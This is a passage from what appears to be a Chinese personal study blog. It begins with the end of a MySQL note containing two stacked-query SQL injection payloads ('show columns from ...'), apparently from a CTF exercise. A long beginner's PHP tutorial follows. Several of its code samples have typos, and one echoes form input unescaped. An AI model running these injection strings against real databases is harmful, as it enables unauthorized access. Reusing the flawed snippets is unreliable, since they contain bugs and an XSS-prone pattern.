class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-number">-1</span>&#x27;; show columns <span class="hljs-keyword">from</span> &#x27;<span class="hljs-built_in">words</span>&#x27;;<span class="hljs-comment">#</span><br><span class="hljs-number">-1</span>&#x27;; show columns <span class="hljs-keyword">from</span> `<span class="hljs-number">1919810931114514</span>`;<span class="hljs-comment">#</span><br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MySQL</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP学习</title>
    <link href="/2025/03/05/PHP%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/03/05/PHP%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="一、变量"><a href="#一、变量" class="headerlink" title="一、变量"></a>一、变量</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$x</span>;<br><span class="hljs-comment">//PHP是一种弱类型语言，其必声明数据类型</span><br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="作用域"><a href="#作用域" class="headerlink" title="作用域"></a>作用域</h2><ul><li>local</li><li>global</li><li>static</li><li>parameter</li></ul><h3 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h3><p>当在函数内使用时需要在全局变量前加上,<strong>global</strong>关键词</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-variable">$x</span>=<span class="hljs-number">5</span>;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my_function</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-variable">$y</span>=<span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$x</span>;<br>    <span class="hljs-variable">$x</span>=<span class="hljs-variable">$x</span>+<span class="hljs-variable">$y</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; 变量x为<span class="hljs-subst">$x</span>&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量y为<span class="hljs-subst">$y</span>&quot;</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">my1_function</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br> <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;x&#x27;</span>]=<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;x&#x27;</span>]+<span class="hljs-variable">$y</span>+<span class="hljs-number">3</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;变量x为<span class="hljs-subst">$x</span>&quot;</span><br>&#125;<br>    <br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>关键词<strong>static</strong>和C语言一致</p><h3 id="超级全局变量"><a href="#超级全局变量" class="headerlink" title="超级全局变量"></a>超级全局变量</h3><ul><li>$GLOBALS</li><li>$_SERVER</li><li>$_REQUEST</li><li>$_POST</li><li>$_GET</li><li>$_FILES</li><li>$_ENV</li><li>$_COOKIE</li><li>$_SESSION</li></ul><p><strong>GLOBALS</strong>是一个包含了全部变量的全局组合数组，变量的名字就是数组的键</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-variable">$x</span> = <span class="hljs-number">75</span>; <br><span class="hljs-variable">$y</span> = <span class="hljs-number">25</span>;<br> <br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">addition</span>(<span class="hljs-params"></span>) </span><br><span class="hljs-function"></span>&#123; <br>    <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;z&#x27;</span>] = <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;x&#x27;</span>] + <span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;y&#x27;</span>]; <br>&#125;<br> <br><span class="hljs-title function_ invoke__">addition</span>(); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$z</span>; <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><strong>$_SERVER</strong></p><table><thead><tr><th>$_SERVER[‘PHP_SELF’]</th><th>当前执行脚本的文件名，与 document root 有关。例如，在地址为 <a href="http://example.com/test.php/foo.bar">http://example.com/test.php/foo.bar</a> 的脚本中使用 $<em>SERVER[‘PHP_SELF’] 将得到 &#x2F;test.php&#x2F;foo.bar。__FILE</em>_ 常量包含当前(例如包含)文件的完整路径和文件名。 从 PHP 4.3.0 版本开始，如果 PHP 以命令行模式运行，这个变量将包含脚本名。之前的版本该变量不可用。</th></tr></thead><tbody><tr><td>$_SERVER[‘SERVER_ADDR’]</td><td>当前运行脚本所在的服务器的 IP 地址。</td></tr><tr><td>$_SERVER[‘QUERY_STRING’]</td><td>query string（查询字符串），如果有的话，通过它进行页面访问。</td></tr><tr><td>$_SERVER[‘REQUEST_METHOD’]</td><td>访问页面使用的请求方法；例如，”GET”, “HEAD”，”POST”，”PUT”。</td></tr><tr><td>$_SERVER[‘SERVER_ADDR’]</td><td>当前运行脚本所在的服务器的 IP 地址。</td></tr></tbody></table><p><strong>$_REQUEST</strong></p><p>用于收集HTML表单提交的数据。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs php+HTML">&lt;html&gt;<br>&lt;body&gt;<br> <br>&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;];?&gt;&quot;&gt;<br>Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;<br>&lt;input type=&quot;submit&quot;&gt;<br>&lt;/form&gt;<br> <br>&lt;?php <br>$name = $_REQUEST[&#x27;fname&#x27;]; <br>echo $name; <br>?&gt;<br> <br>&lt;/body&gt;<br>&lt;/html&gt;<br>&lt;!--&lt;html&gt;<br>&lt;body&gt;<br>&lt;form method=&quot;post&quot; action=&quot;&lt;?php echo $_SERVER[&#x27;PHP_SELF&#x27;];?&gt;&quot;&gt;<br>Name: &lt;input type=&quot;text&quot; name=&quot;fname&quot;&gt;<br>&lt;input type=&quot;submit&quot;&gt;<br>&lt;/form&gt;<br>&lt;?php <br>$name = $_REQUEST[&#x27;fname&#x27;]; <br>echo $name; <br>?&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;--&gt;<br></code></pre></td></tr></table></figure><p><strong>$_POST</strong></p><p>PHP $_POST 被广泛应用于收集表单数据，在HTML form标签的指定该属性：”method&#x3D;”post”。</p><h1 id="二、输出"><a href="#二、输出" class="headerlink" title="二、输出"></a>二、输出</h1><blockquote><p><strong>提示：</strong>使用的时候可以不用加括号，也可以加上括号， echo 或 echo()echo 输出的速度比 print 快， echo 没有返回值，print有返回值1。</p></blockquote><h2 id="echo"><a href="#echo" class="headerlink" title="echo"></a>echo</h2><p>可以输出一个或多个字符串</p><blockquote><p>当输出多个参数时不能用括号</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$txt1</span>=<span class="hljs-string">&quot;学习 PHP&quot;</span>;<br><span class="hljs-variable">$cars</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>); <br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$txt1</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;我车的品牌是 <span class="hljs-subst">&#123;$cars[0]&#125;</span>&quot;</span>;<br>    <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h2 id="print"><a href="#print" class="headerlink" title="print"></a>print</h2><p> 只允许输出一个字符串，返回值总为 1</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;&lt;h2&gt;PHP 很有趣!&lt;/h2&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Hello world!&lt;br&gt;&quot;</span>;<br><span class="hljs-keyword">print</span> <span class="hljs-string">&quot;我要学习 PHP!&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="PHP-EOF"><a href="#PHP-EOF" class="headerlink" title="PHP EOF"></a>PHP EOF</h1><p>没看懂……</p><ul><li>\1. 必须后接分号，否则编译通不过。</li><li>\2. <strong>EOF</strong> 可以用任意其它字符代替，只需保证结束标识与开始标识一致。</li><li><strong>3. 结束标识必须顶格独自占一行(即必须从行首开始，前后不能衔接任何空白和字符)。</strong></li><li>\4. 开始标识可以不带引号或带单双引号，不带引号与带双引号效果一致，解释内嵌的变量和转义符号，带单引号则不解释内嵌的变量和转义符号。</li><li>\5. 当内容需要内嵌引号（单引号或双引号）时，不需要加转义符，本身对单双引号转义，此处相当与q和qq的用法。</li></ul><h1 id="四、数据类型"><a href="#四、数据类型" class="headerlink" title="四、数据类型"></a>四、数据类型</h1><ul><li>String（字符串）</li><li>Integer（整型）</li><li>Float（浮点型）</li><li>Boolean（布尔型）</li><li>Array（数组）</li><li>Object（对象）</li><li>NULL（空值）</li></ul><p>PHP 用<strong>var_dump()<strong>函数</strong>返回变量的数据类型和值</strong></p><h2 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$txt1</span>=<span class="hljs-string">&quot;hello&quot;</span>;<br><span class="hljs-comment">//并置运算符 . 将两个字符串连接起来</span><br><span class="hljs-variable">$txt2</span>=<span class="hljs-string">&quot;world&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$txt1</span>&quot;</span>.<span class="hljs-string">&quot; &quot;</span>.<span class="hljs-variable">$txt2</span>;<br><span class="hljs-comment">//字符串长度strlen()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$txt1</span>;<br><span class="hljs-comment">//查找字符或一段指定文本strpos()</span><br><span class="hljs-keyword">echo</span> (<span class="hljs-string">&quot;hello,world&quot;</span>,<span class="hljs-string">&quot;world&quot;</span>);<br><span class="hljs-comment">//输出6而不是7是因为字符串是从0开始的，而不是1</span><br><br></code></pre></td></tr></table></figure><p>布尔型：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$x</span>=<span class="hljs-literal">true</span>;<br><span class="hljs-variable">$y</span>=flase;<br></code></pre></td></tr></table></figure><h2 id="数组："><a href="#数组：" class="headerlink" title="数组："></a>数组：</h2><ul><li><strong>数值数组</strong> - 带有数字 ID 键的数组</li><li><strong>关联数组</strong> - 带有指定的键的数组，每个键关联一个值</li><li><strong>多维数组</strong> - 包含一个或多个数组的数</li><li>123</li></ul><h3 id="数值数组"><a href="#数值数组" class="headerlink" title="数值数组"></a>数值数组</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$cars</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;volvo&quot;</span>,<span class="hljs-string">&quot;bmw&quot;</span>);<span class="hljs-comment">//自动分配ID，ID键总是从0开始的</span><br><span class="hljs-variable">$cars2</span>[<span class="hljs-number">0</span>]=<span class="hljs-string">&quot;Volvo&quot;</span>;<br><span class="hljs-variable">$cars2</span>[<span class="hljs-number">1</span>]=<span class="hljs-string">&quot;bmw&quot;</span>;<span class="hljs-comment">//人工分配ID</span><br><span class="hljs-comment">//获取数组长度(元素数量)的count()</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$cars</span>);<br><span class="hljs-comment">//遍历数值数组</span><br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$x</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$x</span>&lt;<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-variable">$cars</span>);<span class="hljs-variable">$x</span>++)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$cars</span>[<span class="hljs-variable">$x</span>];<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="关联数组"><a href="#关联数组" class="headerlink" title="关联数组"></a>关联数组</h3><p>是你自己分配给指定的键的数组</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-variable">$age</span> =<span class="hljs-keyword">array</span>[<span class="hljs-string">&quot;peter&quot;</span>=&gt;<span class="hljs-string">&quot;35&quot;</span>,<span class="hljs-string">&quot;john&quot;</span>=&gt;<span class="hljs-string">&quot;20&quot;</span>];<br><span class="hljs-variable">$age</span>[<span class="hljs-string">&#x27;peter&#x27;</span>]=<span class="hljs-string">&quot;35&quot;</span>;<br><span class="hljs-variable">$age</span>[<span class="hljs-string">&#x27;john&#x27;</span>]=<span class="hljs-string">&quot;20&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;peter is&quot;</span>.age[<span class="hljs-string">&#x27;peter&#x27;</span>].<span class="hljs-string">&quot;years old&quot;</span>;<br><span class="hljs-comment">//遍历关联数组</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$age</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$x</span>=&gt;<span class="hljs-variable">$x_value</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;name=&quot;</span>.<span class="hljs-variable">$x</span>.<span class="hljs-string">&quot;，age=&quot;</span>.<span class="hljs-variable">$x_value</span>;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="数组排序"><a href="#数组排序" class="headerlink" title="数组排序"></a>数组排序</h3><ul><li>sort() - 对数组进行升序排列</li><li>rsort() - 对数组进行降序排列</li><li>asort() - 根据关联数组的值，对数组进行升序排列</li><li>ksort() - 根据关联数组的键，对数组进行升序排列</li><li>arsort() - 根据关联数组的值，对数组进行降序排列</li><li>krsort() - 根据关联数组的键，对数组进行降序排列</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$cars</span>=<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;Volvo&quot;</span>,<span class="hljs-string">&quot;BMW&quot;</span>,<span class="hljs-string">&quot;Toyota&quot;</span>);<br><span class="hljs-title function_ invoke__">sort</span>(<span class="hljs-variable">$cars</span>);<br><span class="hljs-title function_ invoke__">rsort</span>(<span class="hljs-variable">$cars</span>);<br><span class="hljs-comment">//剩下那几个用法一致</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$cars</span>);<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><blockquote><p>补：print_r ：print_r ( mixed $expression [, bool $return &#x3D; false ] )</p><ul><li>**<code>$expression</code>**：要打印的变量，它可以是任何类型，包括数组和对象。</li><li>**<code>$return</code>**：可选参数。如果设置为<code>true</code>，则<code>print_r</code>会将输出结果以字符串形式返回，而不是直接打印到页面上。</li></ul><p>是 PHP 中的一个函数，常用于以可读的方式打印变量结构，例如数组或对象。它会输出变量的结构和内容（内部结构，如索引及对应的值），方便开发者调试和查看变量信息。</p></blockquote><h2 id="对象："><a href="#对象：" class="headerlink" title="对象："></a>对象：</h2><p>你必须使用class关键字声明类对象。类是可以包含属性和方法的结构。然后我们在类中定义数据类型，然后在实例化的类中使用数据类型</p><h2 id="资源类型"><a href="#资源类型" class="headerlink" title="资源类型"></a>资源类型</h2><p>PHP 资源 resource 是一种特殊变量，保存了到外部资源的一个引用。常见资源数据类型有打开文件、数据库连接、图形画布区域等。由于资源类型变量保存有为打开文件、数据库连接、图形画布区域等的特殊句柄，因此将其它类型的值转换为资源没有意义</p><p><strong>get_resource_type()</strong> 函数可以返回资源（resource）类型</p><h1 id="五、类型比较"><a href="#五、类型比较" class="headerlink" title="五、类型比较"></a>五、类型比较</h1><ul><li>松散比较：使用两个等号 <strong>&#x3D;&#x3D;</strong> 比较，只比较值，不比较类型。</li><li>严格比较：用三个等号 <strong>&#x3D;&#x3D;&#x3D;</strong> 比较，除了比较值，也比较类型</li></ul><h1 id="六、常量"><a href="#六、常量" class="headerlink" title="六、常量"></a>六、常量</h1><h2 id="define"><a href="#define" class="headerlink" title="define"></a>define</h2><p>define( string $name, mixed$value,[bool $case_insensitive &#x3D; false ])</p><ul><li><p><strong>name：</strong>必选参数，常量名称，即标志符。</p></li><li><p><strong>value：</strong>必选参数，常量的值。</p></li><li><p><strong>case_insensitive</strong> ：可选参数，如果设置为 TRUE，该常量则大小写不敏感，默认是大小写敏感的。</p><p><strong>注意：</strong>自 PHP 7.3.0 开始，定义不区分大小写的常量已被弃用。从 PHP 8.0.0 开始，只有 false 是可接受的值，传递 true 将产生一个警告。</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">define</span>(GEEETING,<span class="hljs-string">&quot;hello&quot;</span>);<br><span class="hljs-keyword">echo</span> GREETING;<br><span class="hljs-comment">//常量数组</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&quot;fruit&quot;</span>,[<span class="hljs-string">&quot;apple&quot;</span>,<span class="hljs-string">&quot;banana&quot;</span>,<span class="hljs-string">&quot;pear&quot;</span>]);<br><span class="hljs-keyword">echo</span> fruit[<span class="hljs-number">0</span>];<br></code></pre></td></tr></table></figure><blockquote><p>常量定义后默认是全局变量</p></blockquote><h2 id="const"><a href="#const" class="headerlink" title="const"></a>const</h2><p>const CONTANT_NAME &#x3D;”value”;</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">abc</span> =<span class="hljs-string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;<br><span class="hljs-keyword">echo</span> abc;<br><span class="hljs-comment">//常量数组</span><br><span class="hljs-keyword">const</span> <span class="hljs-variable constant_">color</span>=[<span class="hljs-string">&quot;red&quot;</span>,<span class="hljs-string">&quot;white&quot;</span>,<span class="hljs-string">&quot;white&quot;</span>];<br><span class="hljs-keyword">echo</span> color[<span class="hljs-number">1</span>];<br></code></pre></td></tr></table></figure><h1 id="七、运算符"><a href="#七、运算符" class="headerlink" title="七、运算符"></a>七、运算符</h1><table><thead><tr><th>运算符</th><th>名称</th><th>描述</th><th>实例</th><th>结果</th></tr></thead><tbody><tr><td>-x</td><td>设置负数</td><td>取 x 的相反符号</td><td><code>&lt;?php $x = 2; echo -$x; ?&gt;</code></td><td>-2</td></tr><tr><td>~x</td><td>取反</td><td>x 取反，按二进制位进行”取反”运算。运算规则：<code>~1=-2;    ~0=-1;</code></td><td><code>&lt;?php $x = 2; echo ~$x; ?&gt;</code></td><td>-3</td></tr><tr><td>a . b</td><td>并置</td><td>连接两个字符串</td><td>“Hi” . “Ha”</td><td>HiHa</td></tr><tr><td>x!&#x3D;&#x3D;y</td><td>不等于</td><td>如果 x 不等于 y，或它们类型不相同，则返回 true</td><td>5!&#x3D;&#x3D;”5”</td><td>返回 true</td></tr><tr><td>x &lt;&gt; y</td><td>不等于</td><td>如果 x 不等于 y，则返回 true</td><td>5&lt;&gt;8</td><td>返回 true</td></tr><tr><td>x xor y</td><td>异或</td><td>如果 x 和 y 有且仅有一个为 true，则返回 true</td><td>x&#x3D;6 y&#x3D;3 (x&#x3D;&#x3D;6 xor y&#x3D;&#x3D;3)</td><td>返回 false</td></tr></tbody></table><h3 id="三元运算符"><a href="#三元运算符" class="headerlink" title="三元运算符"></a>三元运算符</h3><p>(expr1) ? (expr2) : (expr3) </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$username</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>] : <span class="hljs-string">&#x27;nobody&#x27;</span>;<br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;user&#x27;</span>] ?? <span class="hljs-string">&#x27;nobody&#x27;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$username</span>, PHP_EOL;<br></code></pre></td></tr></table></figure><blockquote><p>注：PHP_EOF是一个换行符，兼容更大的平台</p><p>isset</p></blockquote><h3 id="组合比较符"><a href="#组合比较符" class="headerlink" title="组合比较符"></a>组合比较符</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$c</span>=<span class="hljs-variable">$a</span>&lt;=&gt;<span class="hljs-variable">$b</span>;<br><span class="hljs-comment">/*如果 $a &gt; $b, 则 $c 的值为 1</span><br><span class="hljs-comment">如果 $a == $b, 则 $c 的值为 0</span><br><span class="hljs-comment">如果 $a &lt; $b, 则 $c 的值为 -1*/</span><br></code></pre></td></tr></table></figure><h1 id="八、条件语句"><a href="#八、条件语句" class="headerlink" title="八、条件语句"></a>八、条件语句</h1><p>依旧相同……不想写了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$t</span>=<span class="hljs-title function_ invoke__">date</span>(<span class="hljs-string">&quot;H&quot;</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$t</span>&lt;<span class="hljs-string">&quot;10&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good morning!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$t</span>&lt;<span class="hljs-string">&quot;20&quot;</span>)<br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good day!&quot;</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Have a good night!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$favcolor</span>=<span class="hljs-string">&quot;red&quot;</span>;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$favcolor</span>)<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;red&quot;</span>:<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色是红色!&quot;</span>;<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;blue&quot;</span>:<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色是蓝色!&quot;</span>;<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&quot;green&quot;</span>:<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色是绿色!&quot;</span>;<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;你喜欢的颜色不是 红, 蓝, 或绿色!&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="九、函数"><a href="#九、函数" class="headerlink" title="九、函数"></a>九、函数</h1><p>内建函数<a href="https://www.runoob.com/php/php-ref-array.html">点击学习内建函数</a></p><p>自定义函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">functionName</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">// 要执行的代码</span><br>&#125;<br><span class="hljs-comment">//添加参数</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">functionname1</span>(<span class="hljs-params">$参数<span class="hljs-number">1</span>,$参数<span class="hljs-number">2</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//代码</span><br>    <span class="hljs-keyword">return</span> $变量<span class="hljs-comment">//也可以返回值</span><br>&#125;<br><span class="hljs-title function_ invoke__">functionname1</span>(x,y);<span class="hljs-comment">//x,y可以为任何类型，如是字符串需加&quot;&quot;</span><br><span class="hljs-comment">//</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h1 id="十、命名空间"><a href="#十、命名空间" 